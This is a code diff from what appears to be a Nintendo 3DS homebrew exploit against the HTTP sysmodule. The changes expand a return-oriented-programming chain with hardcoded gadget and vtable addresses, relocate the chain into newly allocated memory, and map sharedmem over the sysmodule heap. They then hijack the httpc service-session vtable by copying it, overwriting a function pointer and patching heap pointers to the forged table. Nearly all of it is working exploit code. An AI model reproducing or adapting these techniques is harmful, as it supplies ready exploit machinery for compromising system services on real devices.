@@ -46,6 +46,11 @@ u32 ROP_sharedmem_create = 0x001045a4;
 
 u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 
+u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
+u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
+
+static u32 __custom_mainservsession_vtable = 0x0f000000 + 0xd00;
+
 void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
 {
 	u32 *ptr = *ropchain;
@@ -258,8 +263,8 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	u32 *ropchain = &tmpbuf[0x600>>2];
 	u32 http_ropvaddr = sharedmembase+0x600;
 
-	u32 *ropchain_ret2http = &tmpbuf[0xf00>>2];
-	u32 ret2http_vaddr = sharedmembase+0xf00;
+	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
+	u32 ret2http_vaddr = sharedmembase+0xfd0;
 	u32 new_ropvmem = 0x0f000000;
 	u32 ret2http_vaddr_new = new_ropvmem + 0xf00;
 
@@ -317,10 +322,10 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
 	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.
 
-	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xfc, new_ropvmem, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
+	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, new_ropvmem, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
 
-	ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x600);
-	ropgen_memcpy(&ropchain, &http_ropvaddr, ret2http_vaddr_new, ret2http_vaddr, 0x100);
+	ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x6d0);
+	ropgen_memcpy(&ropchain, &http_ropvaddr, ret2http_vaddr_new, ret2http_vaddr, 0x30);
 
 	ropgen_stackpivot(&ropchain, &http_ropvaddr, new_ropvmem);//Pivot to the relocated ROP-chain.
 
@@ -337,6 +342,11 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	//Create sharedmem over the entire sysmodule heap, prior to the SOC-sharedmem.
 	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xe0, 0x08000000, 0x22000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
+
+	//Setup the custom vtable used by setuphaxx_httpheap_sharedmem().
+	ropgen_memcpy(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x40404040);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable + 0x8, 1);//Overwrite the vtable funcptr for CreateContext.
 
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
 	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
@@ -387,9 +397,15 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
 
-	if(http_newropvaddr > ret2http_vaddr)
+	if(http_newropvaddr > __custom_mainservsession_vtable)
 	{
-		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - ret2http_vaddr));
+		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - __custom_mainservsession_vtable));
+		return -2;
+	}
+
+	if(http_newropvaddr - new_ropvmem > 0x6d0)
+	{
+		printf("The ROP data for http_newropvaddr is 0x%08x-bytes too large to fit in the allocated sharedmem area.\n", (unsigned int)((http_newropvaddr - new_ropvmem) - 0x6d0));
 		return -2;
 	}
 
@@ -405,7 +421,14 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size)
 {
-	printf("heap+0 = 0x%08x.\n", (unsigned int)httpheap_sharedmem[0]);
+	u32 pos;
+
+	for(pos=0; pos<(httpheap_sharedmem_size>>2); pos++)
+	{
+		if(httpheap_sharedmem[pos] != ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE)continue;
+
+		httpheap_sharedmem[pos] = __custom_mainservsession_vtable;
+	}
 
 	return 0;
 }
